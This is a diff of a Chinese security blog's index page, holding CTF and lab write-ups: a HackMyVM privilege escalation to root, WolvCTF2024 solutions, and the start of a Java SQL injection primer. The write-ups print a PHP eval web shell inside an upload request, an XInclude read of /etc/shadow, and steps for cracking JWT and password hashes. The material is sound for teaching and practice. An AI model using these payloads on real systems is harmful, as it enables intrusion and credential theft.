law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p>发现进到root组里了，提权结束</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/01/22/HackmyVM-BaseME/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1102,275 +1322,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2024/03/18/WolvCTF2024-%E5%A4%8D%E7%9B%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lvzhouhang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/03/18/WolvCTF2024-%E5%A4%8D%E7%9B%98/" class="post-title-link" itemprop="url">WolvCTF2024-复盘</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-03-18 17:40:20 / 修改时间：19:56:03" itemprop="dateCreated datePublished" datetime="2024-03-18T17:40:20+08:00">2024-03-18</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">复盘</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>6.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Bean-Cafe"><a href="#Bean-Cafe" class="headerlink" title="Bean Cafe"></a>Bean Cafe</h2><p>他的验证逻辑是通过图片的md5的值来验证的，所以我们只需要传两张MD5相同的图片就可以获得flag</p>
-<p><a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1eCcMtQkHTreAJT6JmwxG10x1HbT6prY0">https://drive.google.com/drive/folders/1eCcMtQkHTreAJT6JmwxG10x1HbT6prY0</a></p>
-<h2 id="Upload-Fun"><a href="#Upload-Fun" class="headerlink" title="Upload Fun"></a>Upload Fun</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;f&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file too large&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">str_contains</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;f&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no .. in filename please&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;f&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;empty file&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">        <span class="variable">$hash</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$flag</span> . <span class="variable">$ip</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;f&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./uploads/&quot;</span> . <span class="variable">$hash</span> . <span class="string">&quot;_&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;f&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;f&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;./uploads/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&quot;f&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">str_contains</span>(<span class="variable">$path</span>, <span class="string">&quot;..&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;no .. in f please&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">include</span> <span class="variable">$path</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>首先分析一下源码，源码通过POST方式来上传文件并且上传的文件不能包含<code>..</code>用GET的方式来读取文件也不能带有<code>..</code>，上传的文件在<code>uploads</code>目录下，但是我们不知道<code>$hash</code>是什么。</p>
-<p>通过谷歌得知在linux种文件名的长度最大可为255个字符，我们可以通过这种方式让它报错来得知他的值</p>
-<p><img src="/./pic/WolvCTF2024/upload.png"></p>
-<p>我们可以看到他的回显告诉我们了hash的值，然后我们再上传一句话木马访问即可。</p>
-<p>POST上传文件的请求体模板:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: </span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;122&quot;, &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;122&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https://0ad900b10331bc6f843fbff300b80018.web-security-academy.net</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylZktl8pLMuKyOfBy</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Content-Length: 198</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarylZktl8pLMuKyOfBy</span><br><span class="line">Content-Disposition: form-data; name=&quot;&quot;; filename=&quot;&quot;</span><br><span class="line">Content-Type: </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&#x27;1&#x27;])?&gt;</span><br><span class="line">------WebKitFormBoundarylZktl8pLMuKyOfBy</span><br></pre></td></tr></table></figure>
-
-<h2 id="Username"><a href="#Username" class="headerlink" title="Username"></a>Username</h2><p>题目提示了jwt可以爆破，那这道题肯定和jwt伪造有关。</p>
-<p>用jwt-cracker爆破密钥，为<code>mstzt</code></p>
-<p>因为有<data>标签，所以判断为xxe注入，但是正常的xxe他会有过滤，不能引用东西。可以使用<code>XInclude attack</code>关于<a target="_blank" rel="noopener" href="https://d0pt3x.gitbook.io/passion/webapp-security/xxe-attacks/xinclude-attacks">XInclude attack</a></data></p>
-<p>读取/app/app.py文件</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, url_for</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;wcft&#123;fake-flag&#125;&#x27;</span></span><br><span class="line">FLAGUSER_PASSWORD = os.environ.get(<span class="string">&#x27;FLAGUSER_PASSWORD&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;fake-password&#x27;</span></span><br><span class="line"></span><br><span class="line">JWT_SECRET = os.environ.get(<span class="string">&#x27;JWT_SECRET&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;secret&#x27;</span></span><br><span class="line"></span><br><span class="line">JWT_ALG = <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">JWT_COOKIE = <span class="string">&#x27;appdata&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret-welcome-935734&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_welcome</span>():</span><br><span class="line">    <span class="comment"># There is a linux user named &#x27;flaguser&#x27;</span></span><br><span class="line">    <span class="comment"># Login here with that username and their linux password.</span></span><br><span class="line">    auth = request.authorization</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> auth <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> auth.username != <span class="string">&#x27;flaguser&#x27;</span> <span class="keyword">or</span> auth.password != FLAGUSER_PASSWORD:</span><br><span class="line">        resp = flask.Response(<span class="string">&#x27;Please provide the right credentials to get the flag&#x27;</span>)</span><br><span class="line">        resp.headers[<span class="string">&#x27;WWW-Authenticate&#x27;</span>] = <span class="string">&#x27;Basic&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp, <span class="number">401</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Congrats, here is your flag: <span class="subst">&#123;FLAG&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/welcome&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    cookie = request.cookies.get(JWT_COOKIE)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Error: missing <span class="subst">&#123;JWT_COOKIE&#125;</span> cookie value&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jwtData = jwt.decode(cookie, JWT_SECRET, algorithms=[JWT_ALG])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: unable to decode JWT cookie&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    data = jwtData[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: missing data field from decoded JWT&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    xmlText = <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&amp;&#x27;</span> <span class="keyword">in</span> xmlText:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: No entity references please&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;%&#x27;</span> <span class="keyword">in</span> xmlText:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: No parameter file entities please&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    tmp = tempfile.NamedTemporaryFile()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Open the file for writing.</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(tmp.name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(xmlText)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parser = etree.XMLParser(resolve_entities=<span class="literal">False</span>)</span><br><span class="line">        xmlDoc = etree.parse(tmp.name, parser=parser)</span><br><span class="line">        xmlDoc.xinclude()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;XML Error:&#x27;</span>, e)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: Error parsing XML&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    usernameElement = xmlDoc.find(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> usernameElement <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: Missing username element in XML&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    username = usernameElement.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;welcome.html&quot;</span>, username=username)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: username is required&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    username = <span class="built_in">str</span>(username)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">&#x27;^[a-z] $&#x27;</span>, username):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: username must be only lowercase letters&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: username must be at least 3 letters&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &gt; <span class="number">20</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: username must be no longer than 20 letters&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Useful for chal development</span></span><br><span class="line">    <span class="comment"># username = &#x27;&lt;xi:include xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot; href=&quot;/app/app.py&quot; parse=&quot;text&quot;/&gt;&#x27;</span></span><br><span class="line">    xml = <span class="string">f&#x27;&lt;data&gt;&lt;username&gt;<span class="subst">&#123;username&#125;</span>&lt;/username&gt;&lt;/data&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    jwtData = &#123;<span class="string">&quot;data&quot;</span>: xml&#125;</span><br><span class="line"></span><br><span class="line">    cookie = jwt.encode(jwtData, JWT_SECRET, algorithm=JWT_ALG)</span><br><span class="line"></span><br><span class="line">    response = flask.make_response(<span class="string">f&#x27;hello <span class="subst">&#123;username&#125;</span>&#x27;</span>)</span><br><span class="line">    response.set_cookie(JWT_COOKIE, cookie)</span><br><span class="line"></span><br><span class="line">    response.headers[<span class="string">&#x27;location&#x27;</span>] = url_for(<span class="string">&#x27;welcome&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response, <span class="number">302</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<p>在这个文件里可以得知，有一个新的路由<code>/secret-welcome-935734</code>在这里登陆成功后得到flag，用户名为<code>flaguser</code>，密码我们可以用xxe读取<code>/etc/passwd或者/etc/shadow</code>在shadow中我们得知密码为<code>$1$hack$BzqsFHqkPjQ2Sn9amFsgN0</code>这个可以利用<code>hashcat</code>爆破</p>
-<p>关于hashcat的用法<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9909ce4c9e7c"></a></p>
-<p>爆破出来密码是<code>qqz3</code>登录得到flag</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2024/03/16/java%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lvzhouhang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/03/16/java%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">java注入学习</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-03-16 20:56:44" itemprop="dateCreated datePublished" datetime="2024-03-16T20:56:44+08:00">2024-03-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-03-17 17:26:32" itemprop="dateModified" datetime="2024-03-17T17:26:32+08:00">2024-03-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.7k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><h3 id="JDBC是什么"><a href="#JDBC是什么" class="headerlink" title="JDBC是什么"></a>JDBC是什么</h3><p><strong>J</strong>ava <strong>D</strong>ata<strong>B</strong>ase <strong>C</strong>onnectivity（Java语言连接数据库）</p>
-<table>
-<thead>
-<tr>
-<th>接口或类</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>DriverManager类</strong></td>
-<td>1)管理和注册数据库驱动<br>2)得到数据库连接对象</td>
-</tr>
-<tr>
-<td><strong>Connection接口</strong></td>
-<td>一个连接对象，可用于创建Statement和PreparedStatement对象</td>
-</tr>
-<tr>
-<td><strong>Statemen接口</strong></td>
-<td>一个SQL语句对象，用于将SQL语句发送给数据库服务器</td>
-</tr>
-<tr>
-<td><strong>PreparedStetemen接口</strong></td>
-<td>一个SQL语句对象，是Statemen的子接口</td>
-</tr>
-<tr>
-<td><strong>ResultSet接口</strong></td>
-<td>用于封装数据库查询的结果集，返回给数据库Java程序</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>加载和注册驱动的方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Class.forName(数据库驱动实现类)</strong></td>
-<td>加载和注册数据库驱动，数据库驱动由mysql厂商”com.mysql.jbdc.Driver”</td>
-</tr>
-</tbody></table>
-<p>PrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。</p>
-<p>Statement不会对SQL语句进行预编译。</p>
-<p>两种操作都是因为SQL语句拼接导致的SQL注入。</p>
-<h2 id="MyBatis框架"><a href="#MyBatis框架" class="headerlink" title="MyBatis框架"></a>MyBatis框架</h2><p>在mybatis中的，使用<code>#</code>包裹的字段在内部进行了预编译处理，而<code>$</code>并没有使用预编译，也就是JDBC中prepareStatement和Statement的区别。mybatis的sql语句通常是写在xml文件中。</p>
-<h3 id="order-by-盲注"><a href="#order-by-盲注" class="headerlink" title="order by 盲注"></a>order by 盲注</h3><p>在SQL中是不允许union直接跟在order by后面的，所以我们可以考虑使用盲注或报错注入。</p>
-<p>我的理解就是通过order by将列进行排序，通过返回的不同结果</p>
-<p>举个简单的例子:</p>
